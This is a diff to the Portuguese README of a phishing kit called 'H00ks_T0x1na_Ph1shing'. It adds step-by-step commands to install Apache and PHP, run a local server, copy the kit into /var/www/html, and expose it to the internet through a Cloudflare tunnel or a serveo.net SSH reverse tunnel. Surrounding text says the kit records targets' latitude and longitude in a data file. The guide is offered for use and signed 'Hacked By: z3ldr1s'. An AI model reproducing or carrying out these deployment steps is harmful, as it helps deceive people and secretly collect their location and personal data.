@@ -29,8 +29,53 @@ Porem salve a imagem do fundo da pagina sempre como "1.jpg"
 
 Volta as informaçoes em dados.txt... Localização volta em longitude e a latitude (Localização: Lat: loc do alvo Long: loc do alvo).... ![image](https://github.com/user-attachments/assets/bc3dceda-1f54-4929-9178-3e16d5a70ca0)
 
+Com Cloud Flare:
 
+Baixe e Inicie o Servidor Apache2:
+"sudo apt-get install apache2 -y"
+"sudo systemctl start apache2 && sudo systemctl enable apache2.service"
+
+Baixe o php:
+"sudo apt-get install php -y"
+
+Inicie o php:
+"php -S localhost:8080"
+
+Instale o CloudFlare desta maneira:
+"curl -O https://bin.equinox.io/c/VdrWdbjqyF/cloudflared-stable-linux-amd64.deb
+sudo dpkg -i cloudflared-stable-linux-amd64.deb"
+
+Faça login no cloudflare e crie a conta:
+"cloudflared tunnel login"
+
+Inicie o servidor cloudflare:
+"cloudflared tunnel --url http://localhost:8080"
+
+Diretorios corretos:
+"sudo cp -r H00ks_T0x1na_Ph1shing/ /var/www/html"
+
+or
+
+
+Baixe e Inicie o Servidor Apache2:
+"sudo apt-get install apache2"
+"sudo systemctl start apache2 && sudo systemctl enable apache2.service"
+
+Baixe o php:
+"sudo apt-get install php -y"
+
+
+Inicie o php:
+php -S localhost:8080
+
+Use o OpenSSH detsa maneira:
+"ssh -R 80:localhost:443 serveo.net"
+
+Diretorios corretos:
+"sudo cp -r H00ks_T0x1na_Ph1shing/ /var/www/html"
 
 
 Hacked By: z3ldr1s
 Vulgo: ZEL ZEL
+
+Aproveite :)
